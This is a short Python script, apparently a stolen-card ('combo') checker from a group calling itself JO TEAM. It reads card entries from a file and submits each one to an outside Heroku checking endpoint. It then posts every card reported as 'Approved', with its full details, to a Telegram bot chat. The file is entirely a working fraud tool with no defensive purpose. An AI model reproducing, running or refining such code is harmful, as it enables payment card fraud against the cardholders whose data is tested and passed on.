import pyfiglet,requests,os,datetime
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
combo=input(F+'ENTER COMBO NAME :'+X)
file=open(f'{combo}',"+r")
logo = pyfiglet.figlet_format('           JO TEAM ')
print(Z+logo)
o=("#====================================##============================")
print (F+'بدأ الصيد لا تنسى اشتراك بقناتي @TEAM_JO')
print(F+o)
key=input(X+'API KEY :'+F)
token=input(F+'ENTER TOKEN :'+X)
ID=input(X+'ENTER ID :'+B)
print(C+o)
start_num = 0
for P in file.readlines():
 cc=P.replace('\n', '')
 start_num += 1
 msg = requests.get(f'https://heroku-chk-17391421420f.herokuapp.com/?lista={cc}&api={key}').text
 if "✅" in msg or "Approved" in msg:
  print(F+f'[ {start_num} ]',P,' ➜ ',msg)
  mgs1=f'''
𝗖𝗖 ⇾ {cc}
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⇾ Heroku
𝘾𝘼𝙍𝘿 𝙎𝙏𝘼𝙏𝙐𝙎 ⇾ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙! ✅
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ⇾ {msg}
━━━━━━━━━━━━━━━━━  
◆ 𝑩𝒀: @X1_H9 '''
  tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs1}"
  i = requests.post(tlg)
 else:
  print(Z+f'[ {start_num} ]',P,' ➜ ',msg)